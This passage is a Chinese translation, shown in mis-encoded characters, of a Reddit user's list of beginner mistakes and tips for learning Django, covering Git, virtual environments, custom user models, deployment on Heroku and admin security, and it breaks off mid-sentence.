    <content type="html"><![CDATA[<blockquote><p>è¿™ç¯‡æ–‡ç« æ˜¯ reddit ä¸Šç”¨æˆ· <a href="https://www.reddit.com/user/unknownguy0518/">unknownguy0518</a> å‘è¡¨çš„ä»–åœ¨å­¦ä¹ Djangoæ˜¯æ‰€çŠ¯çš„åˆå­¦è€…é”™è¯¯ï¼Œä»¥åŠä»–çš„ä¸€äº›å»ºè®®ã€‚æ›´å¤šå…·ä½“çš„å†…å®¹å¯ä»¥å‰å¾€å¯¹åº”çš„ <a href="https://www.reddit.com/r/django/comments/eld87j/learning_django_beginner_mistakes_i_made_that_you/">è¯é¢˜</a> æŸ¥çœ‹ã€‚</p></blockquote><p>æˆ‘æ˜¯ Django Web æ¡†æ¶çš„æ–°æ‰‹ã€‚æˆ‘ä¹Ÿä¸æ˜¯ä¸“ä¸šçš„ç¨‹åºå‘˜ã€‚æˆ‘æ²¡æœ‰ä»»ä½•äººçš„å¸®åŠ©ï¼Œæˆ‘å­¦åˆ°çš„ä¸€åˆ‡éƒ½æ˜¯é€šè¿‡åå¤è¯•éªŒè€Œå¾—å‡ºçš„ã€‚æˆ‘çŠ¯äº†æ— æ•°çš„é”™è¯¯ï¼Œå½“æˆ‘å›é¦–æ—¶ï¼Œæˆ‘ç°åœ¨ç¬‘äº†ã€‚åœ¨è‰°éš¾å­¦ä¹ äº†å¾ˆå¤šåŸºç¡€çŸ¥è¯†ä¹‹åï¼Œæˆ‘æˆåŠŸåœ°åˆ›å»ºäº†ä¸€ä¸ªç®€å•çš„ç½‘ç«™æ¥æ·»åŠ /æ›´æ–°/åˆ é™¤è”ç³»äººã€‚å®ƒå·²éƒ¨ç½²åœ¨ Herokuï¼ˆå…è´¹æœåŠ¡å™¨ï¼‰ä¸­ã€‚æˆ‘åœ¨è¿™é‡Œå†™çš„å†…å®¹çº¯å±æˆ‘ä¸ªäººè§‚ç‚¹ã€‚å¦‚æœä½ æ˜¯åˆå­¦è€…ï¼Œå¹¶ä¸”çƒ­è¡·äºæ¢ç´¢ Django çš„ä¸–ç•Œï¼Œåˆ™åº”è¯¥é˜…è¯»è¿™ç¯‡æ–‡ç« ã€‚å®ƒå¯èƒ½ä¼šå¸®åŠ©ä½ è§£å†³é—®é¢˜ã€‚</p><p>é‚£äº›æƒ³æµè§ˆæˆ‘çš„ç½‘ç«™çš„äººï¼ˆä»ç„¶éœ€è¦ä¸€äº›å·¥ä½œï¼‰ï¼Œå®ƒæ˜¯ï¼š<a href="https://djangophonebook.herokuapp.com">https://djangophonebook.herokuapp.com</a></p><span id="more"></span><p>ä»¥ä¸‹æ˜¯æˆ‘åœ¨åˆ›å»ºè‡ªå·±çš„ç½‘ç«™çš„è¿‡ç¨‹ä¸­é¢ä¸´çš„ä¸»è¦æŒ‘æˆ˜ï¼š</p><h3><span id="guan-fang-wen-dang-yu-jiao-cheng">å®˜æ–¹æ–‡æ¡£ä¸æ•™ç¨‹</span></h3><p>å¾ˆå¤šå…·æœ‰ Django ç»éªŒæˆ–å…¶ä»–ç¼–ç ç»éªŒçš„äººéƒ½ä¼šå‘Šè¯‰ä½ é˜…è¯»å®˜æ–¹æ–‡æ¡£ï¼Œä»¥äº†è§£æœ‰å…³è¿™ä¸ªå‡ºè‰² Web æ¡†æ¶çš„æ›´å¤šä¿¡æ¯ã€‚å®é™…æ˜¯ï¼Œå¹¶éæ‰€æœ‰äººéƒ½å–œæ¬¢è¿™ä¹ˆé«˜çš„æŠ€æœ¯ç»†èŠ‚ã€‚ä¹ä¸€çœ‹ï¼Œä»»ä½•æŒ‡å®šè¿™æ ·çš„æ¡†æ¶å†…éƒ¨å·¥ä½œçš„æ–‡æ¡£éƒ½ä¼šå“åˆ°æ–°æ‰‹ã€‚æ¯«æ— ç–‘é—®ï¼ŒDjango æ–‡æ¡£æ˜¯éå¸¸è¯¦ç»†å¹¶ä¸”ç»„ç»‡å¾—å¾ˆå¥½ï¼Œä½†æ˜¯æˆ‘å»ºè®®ä½ è§‚çœ‹ä¸€äº›å‡ºè‰²çš„è§†é¢‘æ•™ç¨‹ï¼Œä½¿æˆ‘ä»¬å¯¹æ‰€æœ‰å¯ç”¨åŠŸèƒ½ä»¥åŠå¦‚ä½•åœ¨å®é™…é¡¹ç›®ä¸­å®ç°è¿™äº›åŠŸèƒ½æœ‰æ‰€äº†è§£ã€‚æˆ‘äº²è‡ªæµè§ˆäº† YouTubeä¸Š â€œ<a href="https://www.youtube.com/user/schafer5">Corey Schafer</a>â€ çš„ Django æ•™ç¨‹ã€‚è¿™æ˜¯æˆ‘åœ¨äº’è”ç½‘ä¸Šæ‰¾åˆ°çš„æœ€å¥½çš„æ•™ç¨‹ä¹‹ä¸€ã€‚è¿˜æœ‰å¾ˆå¤šå…¶ä»–äººï¼Œä½†æˆ‘æ€»æ˜¯å›å¤´å»çœ‹ä»–çš„è§†é¢‘ã€‚æˆ‘è¿˜å‘ç° YouTube ä¸Š â€œ<a href="https://www.youtube.com/user/CodingEntrepreneurs">CodingEntrepreneurs</a>â€ çš„â€œ<a href="https://www.youtube.com/playlist?list=PLEsfXFp6DpzTD1BD1aWNxS2Ep06vIkaeW">å°è¯• Django</a>â€ ç³»åˆ—ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆå¥½çš„æ•™ç¨‹ã€‚ä¸€æ—¦æœ‰äº†æ–¹å‘æ„Ÿï¼Œå®˜æ–¹æ–‡æ¡£å°±ä¼šå˜å¾—æ›´åŠ æœ‰æ„ä¹‰ã€‚</p><h3><span id="django-ban-ben">Django ç‰ˆæœ¬</span></h3><p>ç°åœ¨æœ‰å¾ˆå¤šé’ˆå¯¹ Django 1.x ç‰ˆæœ¬çš„æ•™ç¨‹ã€‚å°½ç®¡æˆ‘ä»¬çš„é¡¹ç›®å¾ˆæƒ³ä½¿ç”¨ç›¸åŒçš„ç‰ˆæœ¬ï¼Œä½†æˆ‘å¼ºçƒˆå»ºè®®ä½ ä½¿ç”¨ Django çš„æœ€æ–°ç¨³å®šç‰ˆæœ¬ï¼ˆè¯‘è€…æ³¨ï¼šç¿»è¯‘æ—¶æ˜¯2020å¹´1æœˆï¼Œæœ€æ–°ç‰ˆæœ¬ä¸ºæ˜¯ 2.2.9ï¼‰ã€‚å®ƒä¸ä»…æ¶ˆé™¤äº†é‡å†™ä»£ç ï¼Œè€Œä¸”è¿˜ä½¿æˆ‘ä»¬èƒ½å¤Ÿä½¿ç”¨æ—§ç‰ˆæœ¬å¯èƒ½æ²¡æœ‰çš„æ–°åŠŸèƒ½ã€‚</p><h3><span id="shi-yong-git-he-github">ä½¿ç”¨ Git å’Œ GitHub</span></h3><p>åˆšå¼€å§‹å¤„ç†é¡¹ç›®æ—¶ï¼Œæˆ‘å¿½ç•¥äº†ä½¿ç”¨ Git ç»´æŠ¤ç‰ˆæœ¬æ§åˆ¶ã€‚æœ‰ä¸€å¤©ï¼Œå½“æˆ‘æ¸…é™¤è®¡ç®—æœºä¸­çš„ä¸€äº›æ—§æ–‡ä»¶å¤¹æ—¶ï¼Œæˆ‘ä¸å°å¿ƒåˆ é™¤äº†æ•´ä¸ªé¡¹ç›®æ–‡ä»¶å¤¹ã€‚è¿™æ—¶æˆ‘æ‰æ„è¯†åˆ°ä½¿ç”¨ Git è·Ÿè¸ªæˆ‘åœ¨é¡¹ç›®ä¸­æ‰€åšçš„æ›´æ”¹çš„é‡è¦æ€§æ—¶ã€‚å¯¹äºåƒæˆ‘è¿™æ ·çš„æ–°æ‰‹æ¥è¯´ï¼ŒèŠ±äº†ä¸€æ®µæ—¶é—´æ‰å¼„æ¸…æ¥šå¦‚ä½•ä½¿ç”¨å®ƒï¼ˆæœ‰æ—¶æˆ‘ä»åœ¨ä¸ºå®ƒè€Œè‹¦è‹¦æŒ£æ‰ï¼‰ï¼Œä½†å®ƒä¸ºæˆ‘çœå»äº†å¾ˆå¤šéº»çƒ¦ã€‚æˆ‘è¿˜ä½¿ç”¨ GitHub å°†æ‰€æœ‰ä»£ç è½¬å‚¨ä¸ºä¸€ä¸ªå¼€æºé¡¹ç›®ã€‚ä½ åº”è¯¥è€ƒè™‘ä½¿ç”¨ Gitã€‚å¦‚æœä½ æç ¸äº†å¹¶æƒ³æ¢å¤åˆ°é¡¹ç›®çš„æ—§ç‰ˆæœ¬ï¼Œå®ƒå°†å¯¹ä½ æœ‰å¾ˆå¤§å¸®åŠ©ã€‚ç›¸ä¿¡æˆ‘ï¼Œé‡æ–°ç¼–å†™ä»£ç çœŸçš„å¾ˆä»¤äººæ²®ä¸§ã€‚</p><h3><span id="shi-yong-gitignore-wen-jian">ä½¿ç”¨ <code>.gitignore</code> æ–‡ä»¶</span></h3><p>å¦‚æœä½¿ç”¨çš„æ˜¯ Gitï¼Œè¯·ç¡®ä¿è¿˜ä½¿ç”¨ gitignore æ–‡ä»¶ã€‚æ·»åŠ ä½ ä¸å¸Œæœ› Git è·Ÿè¸ªçš„æ‰€æœ‰æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹ã€‚æœ‰ä¸€ä¸ª GitHub é“¾æ¥ï¼ˆ<a href="https://github.com/github/gitignore">https://github.com/github/gitignore</a>ï¼‰ï¼Œæˆ‘å‚è€ƒçš„æ˜¯ Python.gitignore æ–‡ä»¶ï¼Œå¹¶å°†æ‰€æœ‰å†…å®¹ä»è¯¥æ–‡ä»¶å¤åˆ¶ç²˜è´´åˆ°æˆ‘çš„ gitignore æ–‡ä»¶ä¸­ã€‚å°½ç®¡æŸäº›ç»†èŠ‚ä¸ä¸€å®šç‰¹å®šäº Djangoï¼Œä½†æˆ‘å°†ä¸€åˆ‡ä¿æŒä¸å˜ã€‚å®ƒæ¶µç›–äº†æˆ‘çš„ç”¨ä¾‹çš„æ‰€æœ‰å†…å®¹ã€‚æˆ‘å¼ºçƒˆå»ºè®®ä½ ä»¥æ­¤ä¸ºèµ·ç‚¹ã€‚ä¹‹åï¼Œä½ å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹æ–‡ä»¶ã€‚</p><h3><span id="ti-sheng-ni-de-qian-duan-ji-neng">æå‡ä½ çš„å‰ç«¯æŠ€èƒ½</span></h3><p>æ˜¯çš„ï¼Œä½ å°†éœ€è¦å®ƒã€‚ä½ å°†éœ€è¦è‡³å°‘äº†è§£ HTML çš„åŸºç¡€ï¼Œæ‰èƒ½åœ¨ Django ä¸­åˆ›å»ºæ¨¡æ¿ã€‚äº†è§£ä¸€ç‚¹ CSS å’Œ JavaScript ä¼šæ›´å¥½ã€‚å®ƒå¯ä»¥å¸®åŠ©è¿›ä¸€æ­¥è‡ªå®šä¹‰ç½‘ç«™çš„å¤–è§‚ã€‚å¯¹äºå‰ç«¯ï¼Œæˆ‘æ˜¯ä¸€ä¸ªå®Œå…¨çš„èœé¸Ÿã€‚æˆ‘çŸ¥é“åªæœ‰è¶³å¤Ÿçš„ HTML å¯ä»¥åˆ›å»ºä¸€ä¸ªå‡†ç³»ç»Ÿæ¨¡æ¿ï¼Œè€Œå¯¹ CSS çš„äº†è§£åˆ™å¾ˆå°‘ï¼Œç”šè‡³ä¸è€ƒè™‘è‡ªå®šä¹‰æˆ‘çš„ç½‘ç«™ã€‚å¹¸è¿çš„æ˜¯ï¼Œå¯¹äºåƒæˆ‘è¿™æ ·çš„äººï¼ŒBootstrap å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›ç°æˆçš„å°ç»„ä»¶ï¼Œå¯ä»¥åœ¨æˆ‘çš„ç½‘ç«™ä¸Šä½¿ç”¨ã€‚å®ƒç®€åŒ–äº†æˆ‘çš„è®¸å¤šå‰ç«¯è¦æ±‚ã€‚æˆ‘çš„é¡¹ç›®å®Œå…¨åŸºäº HTML å’Œ Bootstrap æ„å»ºã€‚</p><h3><span id="shi-yong-xu-ni-huan-jing">ä½¿ç”¨è™šæ‹Ÿç¯å¢ƒ</span></h3><p>ä¸ºä½ çš„é¡¹ç›®åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„è™šæ‹Ÿç¯å¢ƒæ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚å½“ä½ å‡†å¤‡éƒ¨ç½²é¡¹ç›®æ—¶ï¼Œè¿™ä¹Ÿå°†æ´¾ä¸Šç”¨åœºã€‚æˆ‘è‰°éš¾åœ°äº†è§£äº†å®ƒçš„é‡è¦æ€§ã€‚ç°åœ¨ï¼Œæˆ‘ä¼šé¦–å…ˆåˆ›å»ºä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒï¼Œå®‰è£…æ‰€æœ‰å¿…éœ€çš„è½¯ä»¶åŒ…ï¼Œç„¶ååœ¨æˆ‘çš„é¡¹ç›®ä¸Šå·¥ä½œã€‚</p><h3><span id="shi-yong-dan-du-de-settings-py-wen-jian-jin-xing-kai-fa-he-sheng-chan">ä½¿ç”¨å•ç‹¬çš„ <code>settings.py</code> æ–‡ä»¶è¿›è¡Œå¼€å‘å’Œç”Ÿäº§</span></h3><p>æˆ‘æ²¡æœ‰ç¢°åˆ°å¤ªå¤šçš„æ•™ç¨‹æ¥è§£é‡Šä¸ºä»€ä¹ˆåœ¨å¼€å‘å’Œç”Ÿäº§è¿‡ç¨‹ä¸­ä½¿ç”¨å•ç‹¬çš„ <code>settings.py</code> æ–‡ä»¶æ˜¯ä¸ªå¥½ä¸»æ„ã€‚å•ç‹¬çš„æ–‡ä»¶å¯å‡å°‘æ··ä¹±ï¼Œå¹¶ä½¿ä»£ç æµ‹è¯•æ•ˆç‡æ›´é«˜ã€‚å½“ä½ è¦è¿›è¡Œå¤§å‹é¡¹ç›®æ—¶ï¼Œè¯·è®°ä½è¿™ä¸€ç‚¹ã€‚å°½ç®¡æˆ‘ä»æœªå®ç°è¿‡å®ƒï¼Œä½†è®¸å¤šä¸“å®¶æ¨èå®ƒã€‚</p><h3><span id="chuang-jian-zi-ding-yi-yong-hu-mo-xing">åˆ›å»ºè‡ªå®šä¹‰ç”¨æˆ·æ¨¡å‹</span></h3><p>å¤§å¤šæ•°æ•™ç¨‹ä½¿ç”¨å†…ç½®çš„ç”¨æˆ·æ¨¡å‹æ¥å­˜å‚¨å’Œå¤„ç†ä¸ç”¨æˆ·ç›¸å…³çš„æ•°æ®ã€‚å¦‚æœä½ æƒ³å°†ç”µå­é‚®ä»¶IDæˆ–æ‰‹æœºå·ç ç”¨ä½œç™»å½•IDï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿå¦‚æœä½ å¸Œæœ›åœ¨æ³¨å†Œæ—¶ä»ç”¨æˆ·é‚£é‡Œæ”¶é›†è‡ªå·±çš„æŸäº›å­—æ®µï¼Œä¾‹å¦‚åŸå¸‚ï¼Œçœä»½ï¼Œæ€§åˆ«ç­‰ï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿä½ å¯ä»¥é€šè¿‡åˆ›å»ºè‡ªå·±çš„è‡ªå®šä¹‰ç”¨æˆ·æ¨¡å‹æ¥åšåˆ°è¿™ä¸€ç‚¹ã€‚é‚£æ—¶ä½ åº”è¯¥è€ƒè™‘éå† <code>AbstractUser</code> å’Œ <code>AbstractBaseUser</code> ç±»ã€‚æˆ‘é€šå¸¸å‚è€ƒä¸¤ä¸ªç½‘ç«™â”€â”€ <a href="https://simpleisbetterthancomplex.com/">https://simpleisbetterthancomplex.com/</a> å’Œ <a href="https://wsvincent.com/">https://wsvincent.com/</a> æ¥å®ç°æ­¤ç›®çš„ã€‚ YouTube ä¸Šçš„ CodingEntrepreneursï¼ˆ<a href="https://www.youtube.com/watch?v=HshbjK1vDtY">https://www.youtube.com/watch?v=HshbjK1vDtY</a>ï¼‰åœ¨å…¶è§†é¢‘ä¹‹ä¸€ä¸­è¿˜ä»‹ç»äº†åˆ›å»ºè‡ªå®šä¹‰ç”¨æˆ·æ¨¡å‹ã€‚æˆ‘å¼ºçƒˆå»ºè®®ä½ è§‚çœ‹å®ƒï¼Œä»¥äº†è§£å…¶çœŸæ­£å·¥ä½œåŸç†ï¼Œè€Œä¸ä»…ä»…æ˜¯å¤åˆ¶ç²˜è´´ä»£ç ã€‚</p><h3><span id="shi-yong-she-jiao-deng-lu">ä½¿ç”¨ç¤¾äº¤ç™»å½•</span></h3><p>å½“ä»Šå¤§å¤šæ•°ç½‘ç«™éƒ½æä¾›äº†ä½¿ç”¨å¤šç§ç¤¾äº¤ç™»å½•ä¹‹ä¸€ï¼ˆä¾‹å¦‚ï¼Œä½¿ç”¨ Google ç™»å½•ï¼Œä½¿ç”¨ Facebook ç™»å½•ç­‰ï¼‰ç™»å½•æˆ–æ³¨å†Œçš„é€‰é¡¹ã€‚ä»¥æˆ‘çš„ä¸ªäººç»éªŒï¼Œæµè§ˆæˆ‘ç½‘ç«™çš„å¤§å¤šæ•°ç”¨æˆ·éƒ½ä½¿ç”¨äº†ç¤¾äº¤ç™»å½•æˆ‘æä¾›çš„ç™»å½•é€‰é¡¹ï¼Œè€Œä¸æ˜¯æ ‡å‡†çš„æ³¨å†Œè¿‡ç¨‹ã€‚åœ¨å°†å…¶ä»˜è¯¸å®è·µä¹‹å‰ï¼Œåœ¨ä½ çš„é¡¹ç›®ä¸­å®ç°å®ƒéå¸¸æœ‰æ„ä¹‰ã€‚ â€œDjango-Allauthâ€ åº“æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„å¼€å§‹ï¼Œæˆ‘æ›¾ç»ç”¨å®ƒæ¥å®ç° Google ç™»å½•ã€‚</p><h3><span id="she-ji-mo-xing">è®¾è®¡æ¨¡å‹</span></h3><p>åœ¨éƒ¨ç½²é¡¹ç›®ä¹‹å‰ï¼Œè€ƒè™‘ä¸€ä¸‹è¦å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ•°æ®ç±»å‹å§‹ç»ˆæ˜¯ä¸€ä¸ªå¥½ä¸»æ„ã€‚å“ªäº›å­—æ®µåº”è¯¥æ˜¯å¿…å¡«å­—æ®µï¼Œå“ªäº›å­—æ®µå¯ä»¥æ˜¯å¯é€‰å­—æ®µï¼Œåœ¨ç”¨æˆ·æ³¨å†Œæ—¶è¦æ•è·çš„ä¿¡æ¯ï¼Œæ‰€æœ‰è¿™äº›éƒ½å¿…é¡»äº‹å…ˆè¿›è¡Œä»”ç»†è€ƒè™‘ã€‚ç½‘ç«™ä¸Šçº¿åï¼Œå¯¹æ¨¡å‹è¿›è¡Œä»»ä½•æ›´æ”¹éƒ½ä¼šè¯æ˜æ˜¯ä¸€ä»¶éå¸¸æ˜‚è´µçš„äº‹æƒ…ï¼Œå› ä¸ºæˆ‘çŠ¯äº†è¿™ä¸ªé”™è¯¯ã€‚</p><h3><span id="ji-yu-han-shu-de-shi-tu-fbv-yu-ji-yu-lei-de-shi-tu-cbv">åŸºäºå‡½æ•°çš„è§†å›¾ï¼ˆFBVï¼‰ä¸åŸºäºç±»çš„è§†å›¾ï¼ˆCBVï¼‰</span></h3><p>å¯¹äºåƒæˆ‘ä»¬è¿™æ ·çš„åˆå­¦è€…æ¥è¯´ï¼Œè¿™å§‹ç»ˆæ˜¯ä¸€ä¸ªéš¾é¢˜ã€‚æ ¹æ®æˆ‘çš„ç»éªŒï¼Œæˆ‘å‘ç°åŸºäºé€šç”¨ç±»çš„è§†å›¾éå¸¸å®¹æ˜“ç¼–å†™ï¼Œæ‰€ç”¨çš„ä»£ç è¡Œæ•°å°‘å¾—å¤šï¼Œå¹¶ä¸”ä½¿äº‹æƒ…çœ‹èµ·æ¥æ›´åŠ æ•´æ´ã€‚è¿™æ˜¯æˆ‘ä»¬çœŸæ­£å¯ä»¥çœ‹åˆ°æ‰€æœ‰é­”æœ¯å‘ç”Ÿçš„åœ°æ–¹ï¼Œå› ä¸º Django åœ¨åç«¯ä¸ºæˆ‘ä»¬å®Œæˆäº†æ‰€æœ‰ç¹é‡çš„å·¥ä½œã€‚ä½†æ˜¯ï¼Œæˆ‘è¿˜å‘ç°ï¼Œä½¿ç”¨ CBV å®ç°ä»»ä½•è‡ªå®šä¹‰é€»è¾‘ä¸æ˜¯éå¸¸ç”¨æˆ·å‹å¥½ã€‚æˆ‘åœ¨äº’è”ç½‘ä¸Šä¹Ÿæ‰¾ä¸åˆ°å¤ªå¤šæœ‰å…³å¦‚ä½•ä½¿ç”¨å’Œè¦†ç›–ç°æœ‰ CBV æ–¹æ³•çš„èµ„æ–™ã€‚è¿™æ­£æ˜¯åŸºäºå‡½æ•°çš„è§†å›¾è“¬å‹ƒå‘å±•çš„åœ°æ–¹ã€‚å®ƒä»¬éœ€è¦ç¼–å†™æ›´å¤šçš„ä»£ç è¡Œï¼Œè§£é‡Šèµ·æ¥å¯èƒ½ä¼šæ›´å¤æ‚ï¼Œä½†æ˜¯å½“æˆ‘ä»¬å¿…é¡»å®ç°ä»»ä½•è‡ªå®šä¹‰é€»è¾‘æ—¶ï¼Œå®ƒä»¬å°±å¯èƒ½ä¼šæ˜¾å¾—å¾ˆå¼ºå¤§ã€‚äº†è§£ CBV å’Œ FBV çš„å·¥ä½œåŸç†ç¡®å®æœ‰å¸®åŠ©ã€‚ä½†æ˜¯å¯¹äºå¤§å¤šæ•°ç”¨ä¾‹æ¥è¯´ï¼ŒCBV å¯ä»¥è½»æ¾å®Œæˆå·¥ä½œã€‚è¿™æ˜¯æˆ‘åˆ›å»ºè§†å›¾æ—¶çš„é¦–é€‰è·¯å¾„ã€‚</p><h3><span id="lu-you-he-url">è·¯ç”±å’Œ URL</span></h3><p>é™¤äº†è®¾è®¡æ¨¡å‹ä¹‹å¤–ï¼Œåœ¨åˆ›å»ºé¡¹ç›®æ—¶è§„åˆ’æ‰€æœ‰è·¯ç”±ä¹Ÿå¾ˆæœ‰æ„ä¹‰ã€‚æ¸…æ¥šäº†è§£å„ç§ URL è¿˜å¯ç®€åŒ–ç¼–å†™å…¶ç›¸åº”è§†å›¾çš„è¿‡ç¨‹ã€‚å¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯æˆ‘ä»¬è¦ç¡®ä¿å„ä¸ªåº”ç”¨ç¨‹åºä¹‹é—´çš„ URL ä¿æŒä¸€è‡´å¹¶å‡†å¤‡è¿›è¡Œ CRUD æ“ä½œã€‚å½“ç¼–å†™ REST API å…¥å£æ—¶ï¼Œå®ƒä¹Ÿä½¿äº‹æƒ…å˜å¾—æ›´å®¹æ˜“ã€‚</p><h3><span id="zai-sheng-chan-huan-jing-zhong-chu-li-jing-tai-wen-jian-he-mei-ti-wen-jian">åœ¨ç”Ÿäº§ç¯å¢ƒä¸­å¤„ç†é™æ€æ–‡ä»¶å’Œåª’ä½“æ–‡ä»¶</span></h3><p>å¾ˆå°‘æœ‰æ•™ç¨‹å¯ä»¥å‘Šè¯‰ä½ åœ¨å°è¯•éƒ¨ç½²é¡¹ç›®æ—¶å°†é¢ä¸´çš„ä¸€äº›æŒ‘æˆ˜ã€‚æˆ‘è¯•å›¾åœ¨ Heroku ä¸Šéƒ¨ç½²æˆ‘çš„åº”ç”¨ã€‚å½“ä½ è®¾ç½® <code>DEBUG = False</code> æ—¶ï¼Œé»˜è®¤æƒ…å†µä¸‹ Django ä¸æ”¯æŒæä¾›é™æ€æ–‡ä»¶å’Œåª’ä½“æ–‡ä»¶ã€‚å¯¹äºé™æ€æ–‡ä»¶ï¼ŒWhiteNoise åº“ä¸ºæˆ‘å®Œæˆäº†è¿™é¡¹å·¥ä½œã€‚å®ƒçš„æ–‡æ¡£ä¹Ÿå¾ˆç®€å•ã€‚ Heroku ä¸å­˜å‚¨åª’ä½“æ–‡ä»¶ã€‚æˆ‘ä»¬å¿…é¡»ä½¿ç”¨å…¶ä»–æœåŠ¡ï¼Œä¾‹å¦‚ Amazon çš„ S3ï¼Œå¹¶ä½¿ç”¨æ‰€æœ‰å¿…éœ€çš„å‚æ•°ç›¸åº”åœ°æ›´æ–° <code>settings.py</code> æ–‡ä»¶ã€‚ S3ä¹Ÿå¯ä»¥ç”¨äºæä¾›é™æ€æ–‡ä»¶ï¼Œä½†ä¸»è¦ç¼ºç‚¹æ˜¯å®ƒä¸æ˜¯å…è´¹çš„ã€‚ç»“æœï¼Œæˆ‘çš„ç½‘ç«™å½“å‰æ— æ³•åŠ è½½ç”¨æˆ·é€‰æ‹©çš„ä»»ä½•ä¸ªäººèµ„æ–™å›¾ç‰‡ã€‚æˆ‘å°šæœªæ‰¾åˆ°æ›¿ä»£æ–¹æ³•ã€‚é¢„å…ˆè§„åˆ’å¥½ä½ è¦å¦‚ä½•æä¾›åª’ä½“æ–‡ä»¶ï¼Œå¹¶è€ƒè™‘åˆ°æ‰€æ¶‰åŠçš„æˆæœ¬ã€‚</p><h3><span id="chu-li-bu-tong-yong-hu-de-quan-xian">å¤„ç†ä¸åŒç”¨æˆ·çš„æƒé™</span></h3><p>è¿™æ˜¯è¦è€ƒè™‘çš„é‡è¦ç‚¹ã€‚æˆ‘é¢ä¸´çš„æŒ‘æˆ˜ä¹‹ä¸€æ˜¯å¼„æ¸…æ¥šå¦‚ä½•ä¸ºä¸åŒçš„ç”¨æˆ·æˆäºˆæˆ–é™åˆ¶å¯¹ç‰¹å®š URL çš„è®¿é—®ã€‚ä¾‹å¦‚ï¼ŒåŸºäºæŸäº›æ¡ä»¶ï¼Œç”¨æˆ· A å¯èƒ½å…·æœ‰å¯¹ URL çš„åªè¯»è®¿é—®æƒé™ï¼Œè€Œç”¨æˆ· B å¯èƒ½å…·æœ‰å¯¹åŒä¸€ URL çš„å†™è®¿é—®æƒé™ã€‚ä½ ä¸å¸Œæœ›ä¸€ä¸ªç”¨æˆ·è®¿é—®å¦ä¸€ä¸ªç”¨æˆ·é…ç½®æ–‡ä»¶å¹¶å¯¹å…¶è¿›è¡Œæ›´æ–°ã€‚é‚£æ˜¯ä½ éœ€è¦ç¡®ä¿ä¸ºè®¿é—®çš„ URL æˆäºˆé€‚å½“æƒé™çš„åœ°æ–¹ã€‚<a href="https://www.youtube.com/user/schafer5">Corey Schafer</a> çš„æ•™ç¨‹å¯¹æ­¤è¿›è¡Œäº†å¾ˆå¥½çš„ä»‹ç»ã€‚</p><h3><span id="chuang-jian-zi-ding-yi-zhong-jian-jian">åˆ›å»ºè‡ªå®šä¹‰ä¸­é—´ä»¶</span></h3><p>æ¶‰åŠè¯¥ä¸»é¢˜çš„æ•™ç¨‹å¹¶ä¸å¤šã€‚æˆ‘è¿˜æ²¡æœ‰å¼„æ¸…æ¥šå¦‚ä½•åˆ›å»ºè‡ªå·±çš„ä¸­é—´ä»¶ã€‚å½“æˆ‘æœ‰æ›´å¤šä¿¡æ¯æ—¶ï¼Œæˆ‘å°†æ›´æ–°æ­¤éƒ¨åˆ†ã€‚</p><h3><span id="gai-shan-wang-zhan-de-an-quan-xing">æ”¹å–„ç½‘ç«™çš„å®‰å…¨æ€§</span></h3><p>æˆ‘è¿˜æ²¡æœ‰çœ‹åˆ°å¤ªå¤šçš„æ•™ç¨‹æ¥è§£é‡Š <code>python manage.py check -â€“deploy</code>ï¼Œä»¥åŠä¸ºä»€ä¹ˆå®ƒå¯¹ç¡®ä¿æˆ‘ä»¬åœ¨ç½‘ç«™ä¸Šçº¿ä¹‹å‰å…·æœ‰å¿…è¦çš„å®‰å…¨æ€§å¾ˆé‡è¦ã€‚åœ¨å¯ç”¨ç½‘ç«™ä¹‹å‰ï¼Œä½ åº”è¯¥æ¢ç´¢ä¸€äº›ä¸œè¥¿ã€‚ç½‘ç«™çš„å®‰å…¨æ€§å’Œç”¨æˆ·æ•°æ®çš„å®‰å…¨æ€§å¿…é¡»å—åˆ°é‡è§†ã€‚</p><h3><span id="bao-hu-ni-de-guan-li-jie-mian">ä¿æŠ¤ä½ çš„ç®¡ç†ç•Œé¢</span></h3><p>æˆ‘å–œæ¬¢ Django çš„åŸå› ä¹‹ä¸€æ˜¯å› ä¸ºå®ƒå†…ç½®äº†è®¸å¤šå®‰å…¨åŠŸèƒ½ã€‚å…¶ä¸­ä¹‹ä¸€å°±æ˜¯åŠŸèƒ½é½å…¨çš„ç®¡ç†ç•Œé¢ã€‚ç”¨æˆ·è®¿é—®ç®¡ç†é¡µé¢åï¼Œä»–/å¥¹å®é™…ä¸Šå°±å¯ä»¥æ»¥ç”¨æ•°æ®ã€‚åˆ›å»ºè¶…çº§ç”¨æˆ·æ—¶ï¼Œè¯·ç¡®ä¿ä¸è¦ä½¿ç”¨è¯¸å¦‚ <code>admin</code> æˆ– <code>manager</code> ä¹‹ç±»çš„é€šç”¨åç§°ä½œä¸ºç™»å½•IDã€‚å¦å¤–ï¼Œè¯·ç¡®ä¿ä½¿ç”¨å¾ˆéš¾çŒœåˆ°çš„éå¸¸å¼ºçš„å¯†ç ã€‚å¦å¤–ï¼Œå°†ç®¡ç†é¡µé¢çš„è·¯å¾„æ›´æ”¹ä¸ºå®Œå…¨ä¸åŒä¸”éš¾ä»¥ç¡®å®šçš„åç§°ã€‚é¿å…ä½¿ç”¨é»˜è®¤çš„ <code>admin/</code> è·¯å¾„ã€‚æˆ‘è¿˜é‡åˆ°äº†ä¸€ä¸ªåä¸º <code>django-admin-honeypot</code> çš„ç¬¬ä¸‰æ–¹åº“ï¼Œè¯¥åº“é€šè¿‡åˆ›å»ºç±»ä¼¼ç®¡ç†å‘˜çš„é¡µé¢æ¥æ¬ºéª—æœªç»æˆæƒçš„ç”¨æˆ·ï¼Œä½†æ²¡æœ‰æ‰§è¡Œå…¶ä»–ä»»ä½•æ“ä½œã€‚æ­¤å¤–ï¼Œå®ƒè¿˜åœ¨è¡¨ä¸­æ•è·äº†è¿™äº›ç”¨æˆ·çš„è¯¦ç»†ä¿¡æ¯ï¼Œä¾‹å¦‚å…¶ IP åœ°å€å’Œå…¶ä»–å‚æ•°ï¼Œè¿™äº›è¡¨å¯ä»¥åœ¨å®é™…çš„ Admin 